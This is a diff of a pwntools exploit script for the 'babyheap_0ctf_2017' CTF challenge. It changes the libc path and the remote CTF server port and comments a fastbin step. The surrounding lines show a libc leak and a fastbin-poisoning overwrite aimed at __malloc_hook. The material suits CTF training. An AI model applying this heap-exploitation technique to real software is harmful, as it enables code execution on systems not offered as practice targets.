@@ -9,7 +9,8 @@ f_remote = True if "remote" in sys.argv else False
 f_gdb = True if "gdb" in sys.argv else False
 
 vuln_path = "./babyheap_0ctf_2017"
-libc_path = "./libc.so.6"
+libc_path = "/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"
+#libc_path = "./libc.so.6"
 ld_path = "/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so"
 
 elf, rop = ELF(vuln_path), ROP(vuln_path)
@@ -19,7 +20,7 @@ if not f_remote:
     #io = process(vuln_path)
     io = process([vuln_path], env={"LD_PRELOAD": libc_path})
 else:
-    io = remote("node4.buuoj.cn", 27916)
+    io = remote("node4.buuoj.cn", 25570)
 
 
 def ddebug(b=""):
@@ -85,7 +86,7 @@ success("libcaddress -> " + hex(libc.address))
 malloc_s0x23 = libc.symbols["__malloc_hook"] - 0x23
 success("malloc_hook -> " + hex(libc.symbols["__malloc_hook"]))
 
-allocate(0x60)
+allocate(0x60) #0x60->chunksize 0x70, libc mac_hook ->7f
 free(4)
 fill(2, p64(malloc_s0x23))
 
